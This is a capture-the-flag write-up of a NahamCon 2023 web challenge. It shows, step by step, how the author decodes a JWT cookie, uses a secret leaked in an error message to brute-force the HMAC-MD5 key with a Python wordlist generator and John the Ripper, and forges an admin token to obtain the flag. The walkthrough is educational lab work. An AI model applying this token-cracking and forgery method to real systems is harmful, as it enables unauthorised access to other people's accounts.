>Author: @congon4tor#2334  
>  
>Enjoy some of our delicious home made marmalade!
------------------------
We are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend `asdf`.


![Pasted image 20230615153302.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230615153302.png)

On login, it tells us that only admin can see the flag:

![Pasted image 20230616173145.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616173145.png)

With how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie:
`token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg`
Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:

![Pasted image 20230616173339.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616173339.png)

The blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?
```
{
  "username": "admin"
}
```
Converting back to base64, our new token looks like this
`eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg`

When I edit the cookie, it gives me an interesting new error:

![Pasted image 20230616173646.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616173646.png)

```
# Bad Request

Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
```

So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.

I used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:
```python
fp = open("wordlist.txt", "w")

for i in range(ord('a'), ord('z') + 1):
    for j in range(ord('a'), ord('z') + 1):
        for k in range(ord('a'), ord('z') + 1):
            for l in range(ord('a'), ord('z') + 1):
                for m in range(ord('a'), ord('z') + 1):
                    fp.write('fsrwjcfszeg' + chr(i) + chr(j) + chr(k) + chr(l) + chr(m) +  "\n");

fp.close()
```

From this point, I can use my previously valid JWT for asdf, and use `John the Ripper` to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used [Sjord's jwtcrack code](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py) to recreate my token.

Sjord's jwtcrack code:
```python
#!/usr/bin/env python3

import sys
from jwt.utils import base64url_decode
from binascii import hexlify


def jwt2john(jwt):
    """
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """
    jwt_bytes = jwt.encode('ascii')
    parts = jwt_bytes.split(b'.')

    data = parts[0] + b'.' + parts[1]
    signature = hexlify(base64url_decode(parts[2]))

    return (data + b'#' + signature).decode('ascii')


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: %s JWT" % sys.argv[0])
    else:
        john = jwt2john(sys.argv[1])
        print(john)
```

```shell
$ python convert.py 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg'
eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722
```

Cracking the secret with john:

```shell
$ john jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-MD5 [password is key, MD5 256/256 AVX2 8x3])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
fsrwjcfszegvsyfa (?)     
1g 0:00:00:04 DONE (2023-06-16 13:39) 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv
Use the "--show --format=HMAC-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

The secret key is `fsrwjcfszegvsyfa`
Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:

![Pasted image 20230616174953.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616174953.png)

Finalized token:
```
eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg
```

Upon refreshing the page, we get the flag.

![Pasted image 20230616141001.png](https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616141001.png)

`flag{a249dff54655158c25ddd3584e295c3b}`
